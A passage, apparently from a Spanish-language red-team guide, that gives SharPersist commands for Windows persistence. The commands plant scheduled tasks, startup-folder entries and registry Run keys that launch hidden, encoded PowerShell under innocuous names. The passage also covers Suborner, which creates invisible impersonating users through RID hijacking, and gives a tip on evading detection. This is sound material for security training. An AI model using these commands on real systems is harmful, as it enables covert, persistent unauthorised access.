    PS > [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

Mediante tareas programadas (Task Scheduler):

    C:\> SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a
    "-nop -w hidden -enc [base64]" -n "Updater" -m add -o hourly

Inicio al arranque (StartUp Folder):

    C:\> SharPersist.exe -t startupfolder -c
    "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc [base64]" -
    f "UserEnvSetup" -m add

AutoRun en registro (Registry AutoRun):

    C:\> SharPersist.exe -t reg -c [path binario]" -a "/q /n" -k "hkcurun" -v "Updater" -m add

Las dos primeras técnicas se podrían modificar añadiendo otro binario, en caso de no querer hacer uso
de un payload en Powershell (ej: Empire / CobalStrike)

**Persistencia local invisible - Suborner**
Existen ciertas técnicas y herramientas para el mantenimiento de persistencia en sistemas, adicionales
a la ya vistas. Un ejemplo es la herramienta Suborner, que permite la creación dinámica de usuarios invisibles
que impersonan a otros usuarios del sistema.
https://github.com/r4wd3r/Suborner
El uso de Suborner requiere de privilegios NT System, por lo que es necesario elevar privilegios
mediante Psexec u otras técnicas similares.

    C:\> suborner64.exe /username:[usuario] /password:[clave] /rid:[RID] /ridhijacking:[RID]

Es importante destacar que el usuario que crea no es real, y persistente, pues cuando la máquina sea
reiniciada el usuario dejará de existir. Por ello, el uso de Suborner es útil en sistemas que no cuentan
con un reinicio habitual.
Es posible ejecutar suborner sin argumentos, y este selecciona los configurados por defecto, aunque
esto de cara a evitar la detección no es recomendable.

## Referencias

También existen múltiples referencias al uso de Red Teaming para la toma de decisiones:

-   Command Red Team (JDN 1-16)
    
-   Red Team. How to succeed by thinking like the enemy
    
-   Red Teaming. How your business can conquer the competition by challenging everything
